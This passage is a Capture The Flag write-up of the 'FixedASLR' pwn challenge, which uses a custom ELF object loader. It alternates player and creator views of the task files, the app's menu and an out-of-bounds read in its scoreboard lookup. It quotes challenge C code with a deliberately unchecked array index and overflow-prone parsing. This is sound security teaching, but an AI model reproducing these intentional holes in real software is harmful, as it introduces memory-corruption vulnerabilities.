@@ -1,0 +1,1317 @@
+<html>
+<head>
+<title>FixedASLR: .o ELF loader in a CTF task</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+
+               ▗▄▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖▗▄▄▄  ▗▄▖  ▗▄▄▖▗▖   ▗▄▄▖
+               ▐▌     █   ▝▚▞▘ ▐▌   ▐▌  █▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌
+               ▐▛▀▀▘  █    ▐▌  ▐▛▀▀▘▐▌  █▐▛▀▜▌ ▝▀▚▖▐▌   ▐▛▀▚▖
+               ▐▌   ▗▄█▄▖▗▞▘▝▚▖▐▙▄▄▖▐▙▄▄▀▐▌ ▐▌▗▄▄▞▘▐▙▄▄▖▐▌ ▐▌
+                         .o ELF loader in a CTF task
+                    by Gynvael Coldwind of Dragon Sector
+
+
+
+                           ▁▂▃▄▅▆▇█ Intro █▇▆▅▄▃▂▁
+
+Note: If you're interested only in the ELF loader part, search for the phrase
+"Bookmark" or "ELF .o loader" in the text below.
+
+A few years back I was thinking a bit about ways to improve Address Space
+Layout Randomization (ASLR) mechanism. I played around with the idea to
+increase the number of elements that are actually randomized. For libraries
+and executable images, just their base address is randomized – but everything
+within said image stays at the same position relative to other elements of
+this image. What if we could shuffle the order of things inside the image as
+well? Maybe shuffle the function order? Or at least shuffle the compilation
+units around?
+
+┄─━┫Glossary
+ASLR (Address Space Layout Randomization) – A mechanism to allocate typical
+memory regions at unguessable addresses to make exploitation harder. After
+all, if the attacker doesn't know where something is, it's hard for them to
+use it in an exploit. Each operating system has this implemented in a bit of a
+different fashion, though typically it results in the addresses of memory
+allocations for executables, dynamic libraries, stacks, heaps, or individual
+memory allocations being somewhat random. In practice, while ASLR is useful,
+leaking a couple of pointers is usually enough to defeat it.
+┄
+
+At the time, I was still on Google's security team. One thing I was working on
+was Google CTF 2022 qualification round – a security Capture The Flag hacking
+competition, known for its insane level of difficulty. During a CTF tournament
+teams solve challenges (tasks) from various categories, including e.g.
+low-level exploitation, colloquially known as pwn. As such, I decided it would
+be a fun idea to create a CTF task with a custom loader that worked with
+individual compilation units (i.e. .o object files) and shuffled them around
+in memory.
+
+As a CTF task can be enjoyed from both the Player's and the Creator's
+perspectives, the remainder of this article will alternate between these two
+viewpoints. The Player will walk through the solution process, while the
+Creator will comment on key decisions made during the design and
+implementation of the challenge. I hope you'll forgive this little exercise in
+multiple personalities, but I believe it will make this rather lengthy article
+more enjoyable.
+
+The challenge, including its source code, is available under the Apache 2.0
+license here:
+
+  github.com/google/google-ctf/tree/main/2022/quals/pwn-fixedaslr
+
+Any source code pasted in this article is quoting the source code linked
+above.
+
+Enjoy!
+
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ The first information a CTF player encounters about a challenge is, │
+│⠀⣾⣿⣿⣿⡀⠀ of course, the task's name and description, as well as, likely, a   │
+│⠀⣿⠀⠀⠀⣿⠀ list of downloadable files and the IP address of the server-side    │
+│⠀⣿⣿⣿⣿⠁⠀ component of the challenge (if any). So here's what was shown to    │
+│⠀⣿⠀⠀⠀⠀⠀ me:                                                                 │
+│⠀⢿⠀⠀⠀⠀⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀   Task name:  FixedASLR                                             │
+│⠀⣷⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   Task category: pwn (low-level exploitation)                       │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   Task description:                                                 │
+│⠀⢿⣿⣿⣿⣷⠀   I wasn't happy with the default ASLR, so I fixed it.              │
+│⠀⠀⠀⠀⠀⠀⠀   The flag is in a file called "flag" both in / and cwd.            │
+│⠀⢀⣿⣿⣿⡀⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀   Task's files:                                                     │
+│⠀⣿⡷⠶⢾⣿⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀   $ tree -s                                                         │
+│⠀⡿⠀⠀⠀⢿⠀   [       4096]  .                                                  │
+│⠀⠀⠀⠀⠀⠀⠀   ├── [       5040]  basic.o                                        │
+│⠀⣷⠀⠀⠀⣾⠀   ├── [       1664]  debug.o                                        │
+│⠀⣿⠀⠀⠀⣿⠀   ├── [       7280]  game.o                                         │
+│⠀⠈⣿⣿⣿⠁⠀   ├── [       1416]  guard.o                                        │
+│⠀⠀⠀⣿⠀⠀⠀   ├── [      15376]  loader                                         │
+│⠀⠀⠀⡿⠀⠀⠀   ├── [       2088]  main.o                                         │
+│⠀⠀⠀⠀⠀⠀⠀   ├── [       1184]  res.o                                          │
+│⠀⣾⣿⣿⣿⣷⠀   └── [       3056]  syscalls.o                                     │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⣿⣿⡷⠀⠀   0 directories, 8 files                                            │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⢿⣿⣿⣿⡿⠀   Task's server-side address (IP and TCP port):                     │
+│⠀⠀⠀⠀⠀⠀⠀   198.51.100.17:1337                                                │
+│⠀⣾⣿⣿⣿⡀⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀ It's safe to say that a pwn challenge being shipped with object     │
+│⠀⣿⣿⣿⣿⡁⠀ files (*.o) is unusual. Though just looking at the file names and   │
+│⠀⣿⠀⠀⠀⣿⠀ the task's information ("FixedASLR" + "I wasn't happy with the      │
+│⠀⡿⠀⠀⠀⢿⠀ default ASLR, so I fixed it.") I can guess what's going on: the     │
+│⠀⠀⠀⠀⠀⠀⠀ ./loader is a custom ELF linker-loader that works on object files   │
+│⠀⠀⠀⠠⡀⠀⠀ instead of fully-linked dynamic ELFs. And it likely places each     │
+│⠀⠀⠀⠀⢣⠀⠀ object file in a random spot in memory before linking them in       │
+│⠀⠀⠀⠀⠈⣶⠀ memory.                                                             │
+│⠀⠀⠀⠀⠀⣿⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⡀ Let's run some basic checks on the received files:                  │
+│⠀⠀⠀⠀⢀⣿⠇                                                                     │
+│⠀⠀⠀⠀⣸⡿⠀   $ file ./*                                                        │
+│⠀⠀⠀⢰⣿⠁⠀   ./basic.o:    ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⠀⢠⣿⠃⠀⠀   ./debug.o:    ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⠀⣾⡏⠀⠀⠀   ./game.o:     ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⢸⣿⠀⠀⠀⠀   ./guard.o:    ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⢸⡏⠀⠀⠀⠀   ./main.o:     ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⢸⡇⠀⠀⠀⠀   ./res.o:      ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⠸⡇⠀⠀⠀⠀   ./syscalls.o: ELF 64-bit LSB relocatable, x86-64, not stripped    │
+│⠀⠀⢣⠀⠀⠀⠀   ./loader:     ELF 64-bit LSB executable, x86-64, statically       │
+│⠀⠀⠈⢆⠀⠀⠀                 linked, not stripped                                │
+│⠀⠀⠀⠘⡄⠀⠀                                                                     │
+│⠀⠀⠀⠀⢱⠀⠀   $ pwn checksec --file ./loader                                    │
+│⠀⠀⠀⠀⠀⣿⠀   [*] '/.../pwn-fixedaslr/attachments/loader'                       │
+│⠀⠀⠀⠀⠀⣿⠀       Arch:     amd64-64-little                                     │
+│⠀⠀⠀⠀⠀⣿⡄       RELRO:    No RELRO                                            │
+│⠀⠀⠀⠀⢠⣿⠃       Stack:    No canary found                                     │
+│⠀⠀⠀⠀⣼⡟⠀       NX:       NX enabled                                          │
+│⠀⠀⠀⣸⡿⠀⠀       PIE:      No PIE (0x400000)                                   │
+│⠀⠀⢰⣿⠁⠀⠀                                                                     │
+│⠀⢀⣿⠇⠀⠀⠀   $ pwn checksec --file ./main.o                                    │
+│⠀⢸⣿⠀⠀⠀⠀   [*] '/.../pwn-fixedaslr/attachments/main.o'                       │
+│⠀⢸⡇⠀⠀⠀⠀       Arch:     amd64-64-little                                     │
+│⠀⢸⡇⠀⠀⠀⠀       RELRO:    No RELRO                                            │
+│⠀⠘⡇⠀⠀⠀⠀       Stack:    Canary found                                        │
+│⠀⠀⢱⠀⠀⠀⠀       NX:       NX enabled                                          │
+│⠀⠀⠀⢣⠀⠀⠀       PIE:      No PIE (0x0)                                        │
+│⠀⠀⠀⠈⢆⠀⠀                                                                     │
+│⠀⠀⠀⠀⠸⣄⠀ Note: Skipping checksec results for other .o files as they are      │
+│⠀⠀⠀⠀⠀⣿⠀ identical to the ones of main.o.                                    │
+│⠀⠀⠀⠀⠀⣿⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⡆ Thankfully, neither the loader nor the object files are stripped,   │
+│⠀⠀⠀⠀⢰⣿⠁ meaning I can expect all the symbols – or at least function names – │
+│⠀⠀⠀⠀⠛⠃⠀ to be there.                                                        │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ Currently, a consensus seems to be emerging that players should be  ⠀⠀⠀⠀⠀⠀⠀│
+│ provided with non-stripped binaries, as stripping a binary is       ⠀⢀⣿⣿⣿⣷⠀│
+│ ultimately just a cheap way to extend solution time by forcing      ⠀⣿⠀⠀⠀⠀⠀│
+│ players to spend more time on reverse engineering. While this may   ⠀⣿⠀⠀⠀⠀⠀│
+│ be justified for typical reverse engineering (RE) challenges, in    ⠀⣿⠀⠀⠀⠀⠀│
+│ the case of a pwn challenge, it distracts from the main objective – ⠀⠈⣿⣿⣿⡿⠀│
+│ finding the vulnerability and exploiting it.                        ⠀⠀⠀⠀⠀⠀⠀│
+│                                                                     ⠀⣾⣿⣿⣿⡀⠀│
+│ Conversely, it can be argued that providing the full source code    ⠀⣿⠀⠀⠀⣿⠀│
+│ would make things significantly easier. This is true, of course,    ⠀⣿⣿⣿⣿⡁⠀│
+│ though I believe that providing the source should only be done in   ⠀⣿⠀⠀⠀⣿⠀│
+│ two cases: either to make the challenge more accessible for         ⠀⡿⠀⠀⠀⢿⠀│
+│ beginners or to include a few additional traps. This is because C   ⠀⠀⠀⠀⠀⠀⠀│
+│ and C++ are infamous for not being "what you see [in the source     ⠀⣾⣿⣿⣿⣷⠀│
+│ code] is what you get [in the binary]" languages. Due to aggressive ⠀⣿⠀⠀⠀⠀⠀│
+│ optimizations, removal of deadcode, the as-if rule, or the presence ⠀⣿⣿⣿⡷⠀⠀│
+│ of the preprocessor, the source code can paint a significantly      ⠀⣿⠀⠀⠀⠀⠀│
+│ different picture than the binary. As such, the binary should be    ⠀⢿⣿⣿⣿⡿⠀│
+│ considered the source of truth, so adding the source code isn't as  ⠀⠀⠀⠀⠀⠀⠀│
+│ helpful as it looks on the surface.                                 ⠀⢀⣿⣿⣿⡀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ As such, I decided to neither strip the challenge binaries, nor     ⠀⣿⡷⠶⢾⣿⠀│
+│ include the source code.                                            ⠀⠀⠀⠀⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ Something I usually skip – and usually regret skipping – is         │
+│⠀⣾⣿⣿⣿⡀⠀ actually running the application to see how it looks. There might   │
+│⠀⣿⠀⠀⠀⣿⠀ be hints or potential vulnerabilities that are immediately          │
+│⠀⣿⣿⣿⣿⠁⠀ noticeable, so it's always worth taking the time to do it.          │
+│⠀⣿⠀⠀⠀⠀⠀ Therefore, let's run it locally or connect to the server to see the │
+│⠀⢿⠀⠀⠀⠀⠀ target app in action (the output is edited to include &gt;&gt;&gt; which     │
+│⠀⠀⠀⠀⠀⠀⠀ marks user inputs while using the app):                             │
+│⠀⣷⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   $ ./loader                                                        │
+│⠀⣿⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀      ______      Welcome to the                                     │
+│⠀⢿⣿⣿⣿⣷⠀     / ____/___ _____ ___  ___                                       │
+│⠀⠀⠀⠀⠀⠀⠀    / / __/ __ `/ __ `__ \/ _ \                                      │
+│⠀⢀⣿⣿⣿⡀⠀   / /_/ / /_/ / / / / / /  __/                                      │
+│⠀⣿⠀⠀⠀⣿⠀   \____/\__,_/_/ /_/ /_/\___/                                       │
+│⠀⣿⡷⠶⢾⣿⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀                                                                     │
+│⠀⡿⠀⠀⠀⢿⠀   -=*) MAIN MENU:                                                   │
+│⠀⠀⠀⠀⠀⠀⠀     1) Play The Game                                                │
+│⠀⣷⠀⠀⠀⣾⠀     2) See full scoreboard                                          │
+│⠀⣿⠀⠀⠀⣿⠀     3) See score for place                                          │
+│⠀⠈⣿⣿⣿⠁⠀     4) Exit                                                         │
+│⠀⠀⠀⣿⠀⠀⠀   Your choice?                                                      │
+│⠀⠀⠀⡿⠀⠀⠀   &gt;&gt;&gt; 1                                                             │
+│⠀⠀⠀⠀⠀⠀⠀   Have Fun, Good Luck!                                              │
+│⠀⣾⣿⣿⣿⣷⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   Round 1                                                           │
+│⠀⣿⣿⣿⡷⠀⠀   How much is 3 + 0 ?                                               │
+│⠀⣿⠀⠀⠀⠀⠀   &gt;&gt;&gt; 3                                                             │
+│⠀⢿⣿⣿⣿⡿⠀   Yes! +5pts! You have 5pts total.                                  │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣾⣿⣿⣿⡀⠀   Round 2                                                           │
+│⠀⣿⠀⠀⠀⣿⠀   How much is 6 + 6 ?                                               │
+│⠀⣿⣿⣿⣿⡁⠀   &gt;&gt;&gt; 0                                                             │
+│⠀⣿⠀⠀⠀⣿⠀   Wrong! Game Over!                                                 │
+│⠀⡿⠀⠀⠀⢿⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀   -=*) MAIN MENU:                                                   │
+│⠀⠀⠀⠠⡀⠀⠀     1) Play The Game                                                │
+│⠀⠀⠀⠀⢣⠀⠀     2) See full scoreboard                                          │
+│⠀⠀⠀⠀⠈⣶⠀     3) See score for place                                          │
+│⠀⠀⠀⠀⠀⣿⠀     4) Exit                                                         │
+│⠀⠀⠀⠀⠀⣿⡀   Your choice?                                                      │
+│⠀⠀⠀⠀⢀⣿⠇   &gt;&gt;&gt; 2                                                             │
+│⠀⠀⠀⠀⣸⡿⠀   -=*) SCOREBOARD:                                                  │
+│⠀⠀⠀⢰⣿⠁⠀                                                                     │
+│⠀⠀⢠⣿⠃⠀⠀     0. 95pts --- Gary                                               │
+│⠀⠀⣾⡏⠀⠀⠀     1. 90pts --- Yoel                                               │
+│⠀⢸⣿⠀⠀⠀⠀     2. 85pts --- Nicholas                                           │
+│⠀⢸⡏⠀⠀⠀⠀     3. 80pts --- Vanessa                                            │
+│⠀⢸⡇⠀⠀⠀⠀     4. 75pts --- Alice                                              │
+│⠀⠸⡇⠀⠀⠀⠀     5. 70pts --- Elizabeth                                          │
+│⠀⠀⢣⠀⠀⠀⠀     6. 65pts --- Linda                                              │
+│⠀⠀⠈⢆⠀⠀⠀     7. 60pts --- Peter                                              │
+│⠀⠀⠀⠘⡄⠀⠀     8. 55pts --- Wayne                                              │
+│⠀⠀⠀⠀⢱⠀⠀     9. 50pts --- Natalie                                            │
+│⠀⠀⠀⠀⠀⣿⠀                                                                     │
+│⠀⠀⠀⠀⠀⣿⠀   -=*) MAIN MENU:                                                   │
+│⠀⠀⠀⠀⠀⣿⡄     1) Play The Game                                                │
+│⠀⠀⠀⠀⢠⣿⠃     2) See full scoreboard                                          │
+│⠀⠀⠀⠀⣼⡟⠀     3) See score for place                                          │
+│⠀⠀⠀⣸⡿⠀⠀     4) Exit                                                         │
+│⠀⠀⢰⣿⠁⠀⠀   Your choice?                                                      │
+│⠀⢀⣿⠇⠀⠀⠀   &gt;&gt;&gt; 3                                                             │
+│⠀⢸⣿⠀⠀⠀⠀   Which place's score do you want to see (0-9)?                     │
+│⠀⢸⡇⠀⠀⠀⠀   &gt;&gt;&gt; 0                                                             │
+│⠀⢸⡇⠀⠀⠀⠀   To get this place you need to beat this score: 95                 │
+│⠀⠘⡇⠀⠀⠀⠀                                                                     │
+│⠀⠀⢱⠀⠀⠀⠀   -=*) MAIN MENU:                                                   │
+│⠀⠀⠀⢣⠀⠀⠀     1) Play The Game                                                │
+│⠀⠀⠀⠈⢆⠀⠀     2) See full scoreboard                                          │
+│⠀⠀⠀⠀⠸⣄⠀     3) See score for place                                          │
+│⠀⠀⠀⠀⠀⣿⠀     4) Exit                                                         │
+│⠀⠀⠀⠀⠀⣿⠀   Your choice?                                                      │
+│⠀⠀⠀⠀⠀⣿⡆   &gt;&gt;&gt; 4                                                             │
+│⠀⠀⠀⠀⢰⣿⠁   Alright, bye                                                      │
+│⠀⠀⠀⢀⣿⠇⠀   WINNER: Gary                                                      │
+│⠀⠀⠀⣼⡟⠀⠀                                                                     │
+│⠀⠀⣸⡿⠀⠀⠀ The challenge app resembles a typical CTF challenge – a simple      │
+│⠀⢠⣿⠃⠀⠀⠀ text-based interface displaying a menu with several numbered        │
+│⠀⢸⡟⠀⠀⠀⠀ options and waiting for the user to input a choice. This interface  │
+│⠀⢸⡇⠀⠀⠀⠀ is likely to either directly conceal one or more vulnerabilities or │
+│⠀⢸⡇⠀⠀⠀⠀ require a specific combination of options to be used in a           │
+│⠀⠈⡇⠀⠀⠀⠀ particular way to trigger vulnerabilities.                          │
+│⠀⠀⠘⡄⠀⠀⠀                                                                     │
+│⠀⠀⠀⢱⠀⠀⠀ A minor but important technical detail is that the task uses        │
+│⠀⠀⠀⠀⢣⠀⠀ standard input and output directly, rather than setting up a socket │
+│⠀⠀⠀⠀⠈⣶⠀ server. From this, we can infer that in the actual deployment, a    │
+│⠀⠀⠀⠀⠀⣿⠀ daemon fronts the application, accepting connections and running    │
+│⠀⠀⠀⠀⠀⣿⠀ the loader with the network socket being hooked up to its standard  │
+│⠀⠀⠀⠀⠀⠛⠃ input and output.                                                   │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ A simple line-input text interface is a classic of pwn challenges.  ⠀⠀⠀⠀⠀⠀⠀│
+│ While that's most commonly associated with various heap-based       ⠀⢀⣿⣿⣿⣷⠀│
+│ memory corruption vulnerabilities, it's not limited to these kinds  ⠀⣿⠀⠀⠀⠀⠀│
+│ of bugs. The text menu choice is kind of a middle ground between    ⠀⣿⠀⠀⠀⠀⠀│
+│ computer-preferred (yet unreadable to the naked eye) binary         ⠀⣿⠀⠀⠀⠀⠀│
+│ interfaces, and more complex to automatically process but more      ⠀⠈⣿⣿⣿⡿⠀│
+│ pleasant to humans colorful ANSI TUI (Text-based User Interface)    ⠀⠀⠀⠀⠀⠀⠀│
+│ apps. This classic CTF text interface both contains human readable  ⠀⣾⣿⣿⣿⡀⠀│
+│ descriptions – which allows players to understand the challenge     ⠀⣿⠀⠀⠀⣿⠀│
+│ faster – and it's relatively easy to process and interact with by   ⠀⣿⣿⣿⣿⡁⠀│
+│ the exploit script. It also saves the challenge creator from having ⠀⣿⠀⠀⠀⣿⠀│
+│ to figure out how to give the app access to the full "TTY protocol" ⠀⡿⠀⠀⠀⢿⠀│
+│ (e.g. how would a user's terminal send the SIGWINCH aka "terminal   ⠀⠀⠀⠀⠀⠀⠀│
+│ window size has changed" signal to the app running on the server?   ⠀⣾⣿⣿⣿⣷⠀│
+│ would a client application like Telnet or SSH have to be used?) and ⠀⣿⠀⠀⠀⠀⠀│
+│ having to deal with incompatible terminal implementations (after    ⠀⣿⣿⣿⡷⠀⠀│
+│ all, not all pseudoterminals/consoles are created equal).           ⠀⣿⠀⠀⠀⠀⠀│
+│                                                                     ⠀⢿⣿⣿⣿⡿⠀│
+│ The second choice made was whether the challenge itself should be a ⠀⠀⠀⠀⠀⠀⠀│
+│ listening network socket server or should that job be left to some  ⠀⢀⣿⣿⣿⡀⠀│
+│ external parent app (like xinetd, or more likely, something like    ⠀⣿⠀⠀⠀⣿⠀│
+│ kCTF), with the challenge app itself working solely with a single   ⠀⣿⡷⠶⢾⣿⠀│
+│ user over stdin/out/err. This is usually not the challenge          ⠀⣿⠀⠀⠀⣿⠀│
+│ creator's decision but rather a recommendation from the sysadmins   ⠀⡿⠀⠀⠀⢿⠀│
+│ managing the tournament's infrastructure. It often stems from the   ⠀⠀⠀⠀⠀⠀⠀│
+│ approach they have chosen for running challenges. And this is       ⠀⣿⣿⣿⣿⣿⠀│
+│ commonly a consequence of what they have chosen as the way to run   ⠀⠀⠀⣿⠀⠀⠀│
+│ challenges. In general the preference would always be to do         ⠀⠀⠀⣿⠀⠀⠀│
+│ whatever is easier to set up and get running on the CTF server, as  ⠀⠀⠀⣿⠀⠀⠀│
+│ long as it doesn't change the challenge itself too much. And, in    ⠀⠀⠀⡿⠀⠀⠀│
+│ this case, it was easier to have the parent process handle network  ⠀⠀⠀⠀⠀⠀⠀│
+│ connections and spawn a new instance of the challenge for each      ⠀⢀⣿⣿⣿⡀⠀│
+│ connecting client.                                                  ⠀⠀⠀⠀⠀⠀⠀│
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│⠀⠀⠀⠀⠀⠀⠀ Going back to the app's functionality, menu option "3) See score    │
+│⠀⣾⣿⣿⣿⡀⠀ for place" immediately looks like a potential memory leak (at least │
+│⠀⣿⠀⠀⠀⣿⠀ to more experience players), as the app tries a bit too hard to     │
+│⠀⣿⣿⣿⣿⠁⠀ inform me about the input range – "Which place's score do you want  │
+│⠀⣿⠀⠀⠀⠀⠀ to see (0-9)?". As experience and the meme from Simpsons teaches    │
+│⠀⢿⠀⠀⠀⠀⠀ us, a sign is not a cop. So what would happen if we entered -10000  │
+│⠀⠀⠀⠀⠀⠀⠀ or 10000?                                                           │
+│⠀⣷⠀⠀⠀⠀⠀                                                                     │
+│⠀⣿⠀⠀⠀⠀⠀   ...                                                               │
+│⠀⣿⠀⠀⠀⠀⠀   Which place's score do you want to see (0-9)?                     │
+│⠀⣿⠀⠀⠀⠀⠀   &gt;&gt;&gt; -10000                                                        │
+│⠀⢿⣿⣿⣿⣷⠀   To get this place you need to beat this score: 95                 │
+│⠀⠀⠀⠀⠀⠀⠀   ...                                                               │
+│⠀⢀⣿⣿⣿⡀⠀   Which place's score do you want to see (0-9)?                     │
+│⠀⣿⠀⠀⠀⣿⠀   &gt;&gt;&gt; 10000                                                         │
+│⠀⣿⡷⠶⢾⣿⠀   To get this place you need to beat this score: Segmentation       │
+│⠀⣿⠀⠀⠀⣿⠀   fault (core dumped)                                               │
+│⠀⡿⠀⠀⠀⢿⠀                                                                     │
+│⠀⠀⠀⠀⠀⠀⠀ A segmentation fault always brings joy to one's heart. Well OK,     │
+│⠀⣷⠀⠀⠀⣾⠀ perhaps this is limited to pwn challenges and vulnerability         │
+│⠀⣿⠀⠀⠀⣿⠀ research, less so for actual programming projects.                  │
+│⠀⠈⣿⣿⣿⠁⠀                                                                     │
+│⠀⠀⠀⣿⠀⠀⠀ The observed behavior seems to suggest the code looks something     │
+│⠀⠀⠀⡿⠀⠀⠀ like this (pseudocode):                                             │
+│⠀⠀⠀⠀⠀⠀⠀                                                                     │
+│⠀⣾⣿⣿⣿⣷⠀   some_int_t scoreboard_points[10] = { ... };                       │
+│⠀⣿⠀⠀⠀⠀⠀   puts("Which place's score do you want to see (0-9)?               │
+│⠀⣿⣿⣿⡷⠀⠀   unsigned int idx = 0;                                             │
+│⠀⣿⠀⠀⠀⠀⠀   scanf("%u", &idx);                                                │
+│⠀⢿⣿⣿⣿⡿⠀   printf("To get this place you need to beat this score: %i",       │
+│⠀⠀⠀⠀⠀⠀⠀          scoreboard_points[idx]);                                   │
+│⠀⣾⣿⣿⣿⡀⠀                                                                     │
+│⠀⣿⠀⠀⠀⣿⠀ Of course it's unclear whether the scoreboard_points is really a    │
+│⠀⣿⣿⣿⣿⡁⠀ separate array than potential scoreboard_names, but we'll get to    │
+│⠀⠀⠀⠀⠀⠀⠀ such details when we get to reverse engineering the code.           │
+╰────────────────────────────────────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────────────────────────────────────╮
+│ As for the initial vulnerability, the range specified in the text   ⠀⠀⠀⠀⠀⠀⠀│
+│ ("Which place's score do you want to see (0-9)?") was indeed a      ⠀⢀⣿⣿⣿⣷⠀│
+│ strong hint that some kind of a buffer overrun or underrun is at    ⠀⣿⠀⠀⠀⠀⠀│
+│ play there. This is how that functionality looked in the original   ⠀⣿⠀⠀⠀⠀⠀│
+│ source code:                                                        ⠀⣿⠀⠀⠀⠀⠀│
+│                                                                     ⠀⠈⣿⣿⣿⡿⠀│
+│   // Snippet from main.c                                            ⠀⠀⠀⠀⠀⠀⠀│
+│   uint64_t scoreboard[PLAYER_COUNT] = { ... };                      ⠀⣾⣿⣿⣿⡀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│   // Snippet from game.c                                            ⠀⣿⣿⣿⣿⡁⠀│
+│   void see_scoreboard(void) {                                       ⠀⣿⠀⠀⠀⣿⠀│
+│     puts("Which place's score do you want to see (0-9)?");          ⠀⡿⠀⠀⠀⢿⠀│
+│     char line[32];                                                  ⠀⠀⠀⠀⠀⠀⠀│
+│     if (!readline(line, 32)) {                                      ⠀⣾⣿⣿⣿⣷⠀│
+│       return;                                                       ⠀⣿⠀⠀⠀⠀⠀│
+│     }                                                               ⠀⣿⣿⣿⡷⠀⠀│
+│                                                                     ⠀⣿⠀⠀⠀⠀⠀│
+│     uint64_t player_idx = atou64(line);                             ⠀⢿⣿⣿⣿⡿⠀│
+│     print("To get this place you need to beat this score: ");       ⠀⠀⠀⠀⠀⠀⠀│
+│                                                                     ⠀⢀⣿⣿⣿⡀⠀│
+│     char num[32] = {0};                                             ⠀⣿⠀⠀⠀⣿⠀│
+│     u64toa(num, game_scoreboard[player_idx]);                       ⠀⣿⡷⠶⢾⣿⠀│
+│     puts(num);                                                      ⠀⣿⠀⠀⠀⣿⠀│
+│   }                                                                 ⠀⡿⠀⠀⠀⢿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⠀⠀│
+│ What's worth noting, is that this challenge doesn't use functions   ⠀⣿⣿⣿⣿⣿⠀│
+│ from the standard C library – this was to simplify the actual       ⠀⠀⠀⣿⠀⠀⠀│
+│ dynamic loader, so that it doesn't have to handle large – and       ⠀⠀⠀⣿⠀⠀⠀│
+│ likely complex – libraries like libc6.so. At the same time this     ⠀⠀⠀⣿⠀⠀⠀│
+│ increases the challenge difficulty, as there are fewer usable       ⠀⠀⠀⡿⠀⠀⠀│
+│ things in memory (meaning less ROP gadgets). On the flip side, this ⠀⠀⠀⠀⠀⠀⠀│
+│ also decreases the challenge difficulty, as it totally gets any     ⠀⢀⣿⣿⣿⡀⠀│
+│ scenario like "use this weird thing in libc6.so's memory" off the   ⠀⣿⠀⠀⠀⣿⠀│
+│ table, so players don't have to waste time and energy thinking      ⠀⣿⠀⠀⠀⣿⠀│
+│ about that.                                                         ⠀⣿⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠈⣿⣿⣿⠁⠀│
+│ The side effect of this is the need to implement at least some      ⠀⠀⠀⠀⠀⠀⠀│
+│ typical standard helper functions like atou64 aka "ASCIIZ to 64-bit ⠀⣾⣿⣿⣿⡀⠀│
+│ unsigned int", u64toa, readline, or print. But it's always fun to   ⠀⣿⠀⠀⠀⣿⠀│
+│ revisit implementing these, so it's not really an issue.            ⠀⣿⣿⣿⣿⡁⠀│
+│                                                                     ⠀⣿⠀⠀⠀⣿⠀│
+│ It's important to also keep tabs on any quirks and other potential  ⠀⡿⠀⠀⠀⢿⠀│
+│ vulnerabilities introduced while implementing these basic           ⠀⠀⠀⠀⠀⠀⠀│
+│ functions. After all, a pwn challenge should be vulnerable in a     ⠀⠀⠀⠠⡀⠀⠀│
+│ controlled way.                                                     ⠀⠀⠀⠀⢣⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠈⣶⠀│
+│ For example, consider this string-to-int code:                      ⠀⠀⠀⠀⠀⣿⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⡀│
+│   // Snippet from basic.c                                           ⠀⠀⠀⠀⢀⣿⠇│
+│   uint64_t atou64(const char *s) {                                  ⠀⠀⠀⠀⣸⡿⠀│
+│     uint64_t n = 0ULL;                                              ⠀⠀⠀⢰⣿⠁⠀│
+│     while (*s) {                                                    ⠀⠀⢠⣿⠃⠀⠀│
+│       if (*s &gt;= '0' && *s &lt;= '9') {                                 ⠀⠀⣾⡏⠀⠀⠀│
+│         n *= 10ULL;                                                 ⠀⢸⣿⠀⠀⠀⠀│
+│         n += *s++ - '0';                                            ⠀⢸⡏⠀⠀⠀⠀│
+│       } else {                                                      ⠀⢸⡇⠀⠀⠀⠀│
+│         break;                                                      ⠀⠸⡇⠀⠀⠀⠀│
+│       }                                                             ⠀⠀⢣⠀⠀⠀⠀│
+│     }                                                               ⠀⠀⠈⢆⠀⠀⠀│
+│     return n;                                                       ⠀⠀⠀⠘⡄⠀⠀│
+│   }                                                                 ⠀⠀⠀⠀⢱⠀⠀│
+│                                                                     ⠀⠀⠀⠀⠀⣿⠀│
+│ The issue there is that it doesn't handle or signal integer         ⠀⠀⠀⠀⠀⣿⠀│
